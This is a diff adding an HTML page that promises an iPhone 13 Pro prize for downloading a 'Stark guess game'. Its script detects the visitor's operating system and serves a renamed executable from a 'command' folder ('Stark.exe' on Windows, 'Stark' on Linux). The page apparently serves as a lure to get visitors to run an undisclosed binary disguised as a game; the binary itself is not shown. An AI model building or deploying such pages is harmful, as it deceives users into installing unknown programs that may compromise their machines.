@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>WElCOME TO STARK GUESS GAME</h1>
+    <h2>DOWNLOAD OUR PLAY GAME TO WIN IPHONE 13 PRO</h2>
+    <a href="" download id="download">Download</a>
+   <script>
+              function setupDownload() { 
+            var OSName="Unknown OS";
+            if (navigator.platform.indexOf("Win")!=-1) OSName="WINDOWS";
+            if (navigator.platform.indexOf("X11")!=-1) OSName="UNIX";
+            if (navigator.platform.indexOf("Linux")!=-1) OSName="LINUX";
+        
+            console.log(OSName);
+           const downloadHref = (OSName === 'WINDOWS') ? './command/main.exe' : (OSName === 'LINUX' || OSName === 'UNIX')
+                                ? './command/main' : null;
+
+            const downloadName = (OSName === 'WINDOWS') ? 'Stark.exe' : (OSName === 'LINUX' || OSName === 'UNIX')
+            ? 'Stark' : null;
+
+console.log(downloadHref);
+console.log(downloadName);
+           document.getElementById('download').setAttribute('href', downloadHref);
+           document.getElementById('download').setAttribute('download', downloadName);
+           document.getElementById('in-text').innerText = OSName.toLowerCase();
+        } 
+
+        setupDownload();
+   </script>
+</body>
+</html>
